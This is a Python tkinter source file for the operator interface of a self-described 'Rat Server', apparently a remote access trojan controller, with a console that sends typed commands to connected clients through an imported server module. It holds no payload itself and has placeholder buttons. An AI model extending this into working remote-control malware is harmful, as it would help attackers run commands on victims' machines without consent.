#import customtkinter as ctk
#import CTkListbox as ctklb

import tkinter as tk
from tkinter import ttk


import server
import config
import threading

#ctk.set_default_color_theme("green")

class RatUI:
    def __init__(self, *args, **kwargs) -> None:
        """The main ui for the rat, This creates the server instance it's self and should handle everything including exceptions"""
        
        self.server = server.RatServer(config.HOST, config.PORT, self.add_to_console)

        self.app = tk.Tk()
        self.app.geometry("800x500")
        self.app.title("Rat Sever")

        self.app.protocol("WM_DELETE_WINDOW", self._server_stop)

        self.button_frame = tk.Frame(self.app,)
        self.button_frame.pack(fill="x", expand=False, padx=5, pady=(5,0))

        # Random temp button
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")
        tk.Button(self.button_frame, text="Connect").pack(pady=5, padx=5,side="left", anchor="w")

        # Console frame shows command history etc
        self.console_frame = tk.Frame(self.app)
        self.console_frame.pack(fill="both", expand=True, padx=5, pady=5)

        self.command_lb = tk.Listbox(self.console_frame)
        self.command_lb.pack(expand=True, fill="both")

        tk.Button(self.console_frame,text="Send command", command=lambda:self.server.send_command(self.command_entry.get())).pack(anchor="sw", fill="x", pady=(5,0), side="left")
        
        self.command_entry = tk.Entry(self.console_frame)
        self.command_entry.pack(anchor="sw", fill="x", pady=(5,0), side="left", expand=True, padx=5)


        self._server_start()

    def run(self):
        """Starts the mainloop"""
        self.app.mainloop()

    def add_to_console(self,message):
        """Adds the message to the end of the console log"""
        self.command_lb.insert(tk.END,message)

    def send_message(self):
        """Tells the server to send the message and handles UI stuff"""
        cmd = self.command_entry.get()

        self.command_entry.delete(0,tk.END)
        self.server.send_command(cmd)

    def _server_start(self):
        """Starts the server threats"""
        threading.Thread(target=self.server.start, daemon=True).start()

    def _server_stop(self):
        """Handles closings"""
        self.app.destroy()
        self.server.stop()

if __name__ == "__main__":

    rui = RatUI()
    rui.run()